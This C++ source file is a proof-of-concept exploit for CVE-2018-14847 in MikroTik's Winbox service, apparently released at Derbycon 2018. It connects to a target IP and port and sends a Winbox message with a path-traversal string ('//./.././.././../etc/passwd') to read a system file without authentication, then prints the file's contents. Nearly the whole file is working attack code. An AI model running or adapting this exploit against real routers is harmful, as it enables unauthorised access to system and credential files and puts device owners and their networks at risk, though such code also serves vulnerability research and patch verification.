#include <cstdlib>
#include <iostream>
#include <boost/cstdint.hpp>
#include <boost/program_options.hpp>
#include <boost/algorithm/string.hpp>

#include "winbox_session.hpp"
#include "winbox_message.hpp"

namespace
{
    const char s_version[] = "CVE-2018-14847 PoC Derbycon 2018 release";

    bool parseCommandLine(int p_argCount, const char* p_argArray[],
                          std::string& p_ip, std::string& p_port)
    {
        boost::program_options::options_description description("options");
        description.add_options()
            ("help,h", "A list of command line options")
            ("version,v", "Display version information")
            ("port,p", boost::program_options::value<std::string>(), "The port to connect to")
            ("ip,i", boost::program_options::value<std::string>(), "The ip to connect to");

        boost::program_options::variables_map argv_map;
        try
        {
            boost::program_options::store(
                boost::program_options::parse_command_line(
                    p_argCount, p_argArray, description), argv_map);
        }
        catch (const std::exception& e)
        {
            std::cerr << e.what() << std::endl;
            std::cerr << description << std::endl;
            return false;
        }

        boost::program_options::notify(argv_map);
        if (argv_map.empty() || argv_map.count("help"))
        {
            std::cerr << description << std::endl;
            return false;
        }

        if (argv_map.count("version"))
        {
            std::cerr << "Version: " << ::s_version << std::endl;
            return false;
        }

        if (argv_map.count("ip") && argv_map.count("port"))
        {
            p_ip.assign(argv_map["ip"].as<std::string>());
            p_port.assign(argv_map["port"].as<std::string>());
            return true;
        }
        else
        {
            std::cout << description << std::endl;
        }

        return false;
    }
}

int main(int p_argc, const char** p_argv)
{
    std::string ip;
    std::string port;
    if (!parseCommandLine(p_argc, p_argv, ip, port))
    {
        return EXIT_FAILURE;
    }

    Winbox_Session winboxSession(ip, port);
    if (!winboxSession.connect())
    {
        std::cerr << "Failed to connect to the remote host" << std::endl;
        return EXIT_FAILURE;
    }

    WinboxMessage msg;
    msg.set_to(2, 2);
    msg.set_command(7);
    msg.set_request_id(1);
    msg.set_reply_expected(true);
    msg.add_string(1, "//./.././.././../etc/passwd");
    winboxSession.send(msg);

    msg.reset();
    if (!winboxSession.receive(msg))
    {
        std::cerr << "Error receiving a response." << std::endl;
        return EXIT_FAILURE;
    }

    boost::uint32_t sessionID = msg.get_session_id();
    boost::uint16_t file_size = msg.get_u32(2);
    if (file_size == 0)
    {
        std::cout << "File size is 0" << std::endl;
        return EXIT_FAILURE;
    }

    msg.reset();
    msg.set_to(2, 2);
    msg.set_command(4);
    msg.set_request_id(2);
    msg.set_reply_expected(true);
    msg.set_session_id(sessionID);
    msg.add_u32(2, file_size);
    winboxSession.send(msg);

    msg.reset();
    if (!winboxSession.receive(msg))
    {
        std::cerr << "Error receiving a response." << std::endl;
        return EXIT_FAILURE;
    }

    std::string raw_payload(msg.get_raw(0x03));
    std::cout << std::endl << "=== File Contents (size: " << raw_payload.size() << ") ===" << std::endl;

    for (std::size_t i = 0; i < raw_payload.size(); i++)
    {
        std::cerr << raw_payload[i];
    }
    std::cerr << std::endl;

    return EXIT_SUCCESS;
}

